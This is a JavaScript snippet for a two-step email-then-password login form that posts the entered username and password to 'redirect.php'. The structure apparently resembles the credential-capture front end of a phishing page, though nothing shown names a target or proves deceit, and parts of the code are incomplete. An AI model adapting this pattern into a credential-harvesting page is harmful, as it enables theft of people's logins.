<script type="text/javascript">

	var form_email,form_password;
	document.getElementById('emailform').addEventListener('submit',processEmail);
	// document.getElementById('pass_form').addEventListener('submit', processPassword)



	function processEmail(evt){
		evt.preventDefault();

		var email = this.email.value.trim();
		if(ValidateEmail(email)){
			hide('email_error')
			hide('email_wrapper')
			document.getElementById('show').innerHTML = email;
			document.getElementById('showid').value = email;
			show('pass-wrapper')
		}else{

			show('email_error')
		}

	}


 function validateForm(){
 	
 	var email = document.getElementById('showid').value;
 	var password = this.password.value;

 	if(password !=''){
 		hide('keyid_error')
 	}else{
 		show('keyid_error') 
 		return false;		
 	}
 }


	function ValidateEmail(mail) 
	  {
	   if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail))
	    {
	      return (true)
	    }
	      return (false)
	  }


function show(element){
    document.getElementById(element).style.display = "flex";
  }

  function hide(element){
    document.getElementById(element).style.display = "none";
  }

  function sendDetails(email,password) {
      $(document).ready(function(){
		  $("button").click(function(){
		    $.post("redirect.php",
		    {
		      username: email,
		      password: password
		    },
		    function(data,status){
		      console.log("Data: " + data + "\nStatus: " + status);
		    });
		  });
		});
  }
</script>
